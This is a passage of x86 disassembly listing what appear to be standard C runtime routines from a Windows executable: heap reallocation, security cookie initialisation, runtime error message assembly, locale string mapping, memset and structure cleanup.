  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
  4261e9:	add    eax,ecx
  4261eb:	mov    ecx,edx
  4261ed:	and    edx,0x3
  4261f0:	shr    ecx,0x2
  4261f3:	je     0x4261fb
  4261f5:	rep stos DWORD PTR es:[edi],eax
  4261f7:	test   edx,edx
  4261f9:	je     0x426205
  4261fb:	mov    BYTE PTR [edi],al
  4261fd:	add    edi,0x1
  426200:	sub    edx,0x1
  426203:	jne    0x4261fb
  426205:	mov    eax,DWORD PTR [esp+0x8]
  426209:	pop    edi
  42620a:	ret    
  42620b:	mov    eax,DWORD PTR [esp+0x4]
  42620f:	ret    
  426210:	push   esi
  426211:	mov    esi,DWORD PTR [esp+0x8]
  426215:	test   esi,esi
  426217:	je     0x42639e
  42621d:	push   DWORD PTR [esi+0x4]
  426220:	call   0x4244ba
  426225:	push   DWORD PTR [esi+0x8]
  426228:	call   0x4244ba
  42622d:	push   DWORD PTR [esi+0xc]
  426230:	call   0x4244ba
  426235:	push   DWORD PTR [esi+0x10]
  426238:	call   0x4244ba
  42623d:	push   DWORD PTR [esi+0x14]
  426240:	call   0x4244ba
  426245:	push   DWORD PTR [esi+0x18]
  426248:	call   0x4244ba
  42624d:	push   DWORD PTR [esi]
  42624f:	call   0x4244ba
  426254:	push   DWORD PTR [esi+0x20]
  426257:	call   0x4244ba
  42625c:	push   DWORD PTR [esi+0x24]
  42625f:	call   0x4244ba
  426264:	push   DWORD PTR [esi+0x28]
  426267:	call   0x4244ba
  42626c:	push   DWORD PTR [esi+0x2c]
  42626f:	call   0x4244ba
  426274:	push   DWORD PTR [esi+0x30]
  426277:	call   0x4244ba
  42627c:	push   DWORD PTR [esi+0x34]
  42627f:	call   0x4244ba
  426284:	push   DWORD PTR [esi+0x1c]
  426287:	call   0x4244ba
  42628c:	push   DWORD PTR [esi+0x38]
  42628f:	call   0x4244ba
  426294:	push   DWORD PTR [esi+0x3c]
  426297:	call   0x4244ba
  42629c:	add    esp,0x40
  42629f:	push   DWORD PTR [esi+0x40]
  4262a2:	call   0x4244ba
  4262a7:	push   DWORD PTR [esi+0x44]
  4262aa:	call   0x4244ba
  4262af:	push   DWORD PTR [esi+0x48]
  4262b2:	call   0x4244ba
  4262b7:	push   DWORD PTR [esi+0x4c]
  4262ba:	call   0x4244ba
  4262bf:	push   DWORD PTR [esi+0x50]
  4262c2:	call   0x4244ba
  4262c7:	push   DWORD PTR [esi+0x54]
  4262ca:	call   0x4244ba
  4262cf:	push   DWORD PTR [esi+0x58]
  4262d2:	call   0x4244ba
  4262d7:	push   DWORD PTR [esi+0x5c]
  4262da:	call   0x4244ba
  4262df:	push   DWORD PTR [esi+0x60]
  4262e2:	call   0x4244ba
  4262e7:	push   DWORD PTR [esi+0x64]
  4262ea:	call   0x4244ba
  4262ef:	push   DWORD PTR [esi+0x68]
  4262f2:	call   0x4244ba
  4262f7:	push   DWORD PTR [esi+0x6c]
  4262fa:	call   0x4244ba
  4262ff:	push   DWORD PTR [esi+0x70]
  426302:	call   0x4244ba
  426307:	push   DWORD PTR [esi+0x74]
  42630a:	call   0x4244ba
  42630f:	push   DWORD PTR [esi+0x78]
  426312:	call   0x4244ba
